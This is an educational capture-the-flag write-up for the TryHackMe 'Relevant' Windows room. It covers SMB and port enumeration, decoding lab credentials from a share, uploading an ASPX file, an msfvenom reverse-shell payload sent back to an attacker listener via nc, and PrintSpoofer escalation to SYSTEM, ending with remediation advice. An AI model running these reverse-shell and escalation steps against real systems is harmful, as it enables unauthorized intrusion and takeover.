Relevant — TryHackMe Writeup
Platform: TryHackMe
Difficulty: Medium
Category: Windows / Privilege Escalation
Tags: windows smb iis aspx privesc printspoofer

Summary
A Windows Server exposing an anonymously writable SMB share that maps directly to an IIS web root. This allows uploading a malicious ASPX payload and achieving Remote Code Execution, followed by privilege escalation to NT AUTHORITY\SYSTEM via SeImpersonatePrivilege.

Attack Flow
Recon → SMB Enumeration → Credential Discovery
→ Web Root Discovery → ASPX Execution → Reverse Shell
→ SeImpersonatePrivilege → PrintSpoofer → SYSTEM

1. Enumeration
Nmap
bashnmap -p- -sV -sC <TARGET_IP>
Key findings:
PortServiceNotes80IISDefault page, nothing interesting49663IISReal target445SMBAnonymous access enabled3389RDPnoted

Lesson: Always scan all ports (-p-). Port 49663 would have been missed with a default scan.

Web Enumeration
bashcurl http://<TARGET_IP>         # Default IIS page → ignore
curl http://<TARGET_IP>:49663   # Real application
SMB Enumeration
bashsmbclient -L //<TARGET_IP> -N
Found share: nt4wrksv — accessible anonymously with READ/WRITE.
bashsmbclient //<TARGET_IP>/nt4wrksv -N

2. Credential Discovery
Found passwords.txt inside the SMB share. Contents were Base64 encoded:
bashecho "<BASE64_STRING>" | base64 -d
Decoded credentials:

Bob: !P@$$W0rD!123
Bill: Juw4nnaM4n420696969!$$$


Vulnerability: Credentials stored in a publicly accessible share using Base64 — which is encoding, not encryption.


3. SMB → Web Root Discovery
Tested if the SMB share maps to the web root:
bashecho "hello" > test.txt
put test.txt
Then accessed:
http://<TARGET_IP>:49663/nt4wrksv/test.txt
File was visible — SMB share = IIS web root.
Confirmed ASPX code execution:
asp<%
Response.Write("WORKING")
%>
Upload via SMB → trigger via browser → code executes. RCE confirmed.

4. Reverse Shell
Generate payload
bashmsfvenom -p windows/x64/shell_reverse_tcp LHOST=<VPN_IP> LPORT=7777 -f aspx -o rev.aspx
Upload via SMB
bashsmbclient //<TARGET_IP>/nt4wrksv -N
put rev.aspx
Start listener
bashrlwrap nc -lvnp 7777

rlwrap gives you arrow keys and command history — always use it.

Trigger
http://<TARGET_IP>:49663/nt4wrksv/rev.aspx
Shell received. Upgrade to PowerShell:
powershellpowershell

5. Privilege Escalation
Enumerate privileges
powershellwhoami
whoami /priv
Key finding:
SeImpersonatePrivilege    Enabled
This privilege allows impersonating tokens — exploitable via PrintSpoofer on modern Windows.
Upload PrintSpoofer
bashsmbclient //<TARGET_IP>/nt4wrksv -N
put PrintSpoofer64.exe
Execute
cmdPrintSpoofer64.exe -i -c cmd
whoami
nt authority\system

6. Flags
powershelltype C:\Users\*\Desktop\user.txt
type C:\Users\Administrator\Desktop\root.txt

Vulnerabilities Summary
VulnerabilitySeverityAnonymous SMB accessHighWritable SMB shareCriticalCredentials in shared directoryHighWeb root mapped to writable shareCriticalASPX execution enabledCriticalSeImpersonatePrivilege abuseCritical

Remediation

Disable anonymous SMB access
Remove WRITE permissions from public shares
Never store credentials in shared directories
Separate IIS web root from SMB shares
Disable server-side script execution on upload directories
Restrict or disable Print Spooler if not needed
Limit privileges on service accounts


Key Takeaways

Always scan all ports — critical services hide on non-standard ports
SMB write access + web server = potential RCE, always check if they're linked
SeImpersonatePrivilege on Windows almost always means SYSTEM via PrintSpoofer or similar
Base64 is not encryption — treat encoded credentials as plaintext


References

PrintSpoofer - GitHub
TryHackMe - Relevant Room
PayloadsAllTheThings - Windows PrivEsc
